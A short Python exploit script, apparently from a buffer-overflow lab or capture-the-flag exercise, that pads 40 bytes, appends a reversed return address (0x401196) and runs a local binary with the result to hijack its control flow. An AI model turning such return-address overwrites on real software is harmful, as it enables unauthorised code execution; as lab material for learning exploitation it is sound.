import os

offset = 40

buff = offset * (b'x')
print("Current buff:", buff)

addr = bytearray.fromhex("401196")
print("Current addr:", addr)

addr.reverse()
print("Reversed addr:", addr)

buff += addr
print("Execute with buff:", buff)

os.execv('./output.o',['./output.o', buff])
